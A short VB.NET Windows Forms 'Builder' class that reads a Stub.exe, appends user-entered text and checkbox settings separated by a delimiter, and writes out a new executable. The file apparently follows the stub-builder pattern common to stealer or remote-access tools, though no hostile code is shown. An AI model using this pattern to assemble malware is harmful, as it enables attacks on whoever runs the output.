Imports System.IO
Public Class Builder
    Dim Stub, text1, text2 As String
    Const spl = "abccba"
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim s As New SaveFileDialog

        s.ShowDialog()
        If s.FileName > "" Then
            text1 = TextBox1.Text
            text2 = TextBox2.Text
            FileOpen(1, Application.StartupPath & "\Stub.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            Stub = Space(LOF(1))
            FileGet(1, Stub)
            FileClose(1)
            FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(1, Stub & spl & text1 & spl & text2 & spl & TextBox5.Text & spl & CheckBox1.CheckState & spl & TextBox4.Text & spl & CheckBox2.CheckState & spl & TextBox6.Text & spl & CheckBox3.CheckState & spl & TextBox7.Text)
            FileClose(1)
            MsgBox("Done")

        End If
    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub

    Private Sub Label5_Click(sender As Object, e As EventArgs) Handles Label5.Click

    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click

    End Sub

    Private Sub Label7_Click(sender As Object, e As EventArgs) Handles Label7.Click

    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged

    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged

    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged

    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click

    End Sub
End Class